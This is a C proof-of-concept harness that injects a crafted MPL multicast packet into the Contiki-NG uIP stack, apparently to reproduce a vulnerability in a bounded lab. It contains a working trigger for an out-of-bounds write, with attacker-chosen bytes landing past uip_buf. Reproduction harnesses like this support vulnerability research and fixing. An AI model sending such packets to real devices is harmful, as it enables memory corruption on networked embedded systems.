/* Bounded lab harness: inject a crafted MPL data packet into the real
 * Contiki-NG uIP stack (no tun device, no external traffic).
 *
 * Reproduce: see bootstrap.sh and run-all.sh in this directory.
 */
#include "contiki.h"
#include "contiki-lib.h"
#include "contiki-net.h"
#include "net/ipv6/multicast/uip-mcast6.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

PROCESS(mpl_harness_process, "MPL injection harness");
AUTOSTART_PROCESSES(&mpl_harness_process);

static uint8_t pkt[UIP_BUFSIZE];

static void
build_packet(int safe)
{
  int i;
  int udp = safe ? 64 : 48;
  memset(pkt, 0, sizeof(pkt));
  pkt[0] = 0x60;                 /* IPv6 version */
  pkt[6] = 0;                    /* next header: HBHO */
  pkt[7] = 64;                   /* hop limit */
  pkt[4] = 0x04; pkt[5] = 0xd8;  /* payload length 1240 */
  pkt[8] = 0xfe; pkt[9] = 0x80; pkt[15] = 0x34; /* src fe80::1234 */
  pkt[24] = 0xff; pkt[25] = 0x03; pkt[39] = 0xfc; /* dst ff03::fc */
  pkt[40] = 17;                  /* HBHO next header: UDP */
  pkt[41] = safe ? 2 : 0;        /* HBHO total length 24 or 8 bytes */
  pkt[42] = 0x6d;                /* MPL option type */
  pkt[43] = safe ? 18 : 4;       /* option data length */
  pkt[44] = 0xc0;                /* S=3, V=0 */
  pkt[45] = 0x55;                /* seq */
  if(safe) {
    for(i = 0; i < 16; i++) {
      pkt[46 + i] = 'A' + i;     /* complete 16-byte seed ID */
    }
  }
  pkt[udp] = 0x0b; pkt[udp + 1] = 0xb9;
  pkt[udp + 2] = 0x09; pkt[udp + 3] = 0xc9;
  pkt[udp + 4] = 0x04;
  pkt[udp + 5] = safe ? 0xc0 : 0xd0;
  for(i = udp + 8; i < sizeof(pkt); i++) {
    pkt[i] = 0x41 + ((i - udp - 8) % 7);
  }
  if(!safe) {
    /* Chosen trailing bytes land 16 bytes past uip_buf on retransmission. */
    memcpy(&pkt[sizeof(pkt) - 16], "MISHE-OO-TAUF!!", 16);
  }
}

PROCESS_THREAD(mpl_harness_process, ev, data)
{
  static struct etimer wait;
  PROCESS_BEGIN();
  printf("HARNESS: engine=%s uip_buf=%p size=%u\n", UIP_MCAST6.name,
         (void *)uip_buf, (unsigned)UIP_BUFSIZE);
  etimer_set(&wait, CLOCK_SECOND);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&wait));
  build_packet(getenv("MPL_SAFE") != NULL);
  memcpy(uip_buf, pkt, sizeof(pkt));
  uip_len = sizeof(pkt);
  uip_ext_len = 0;
  printf("HARNESS: injecting %u bytes\n", uip_len);
  uip_input();
  printf("HARNESS: injected, waiting for trickle TX\n");
  etimer_set(&wait, CLOCK_SECOND * 20);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&wait));
  printf("HARNESS: done\n");
  PROCESS_END();
}
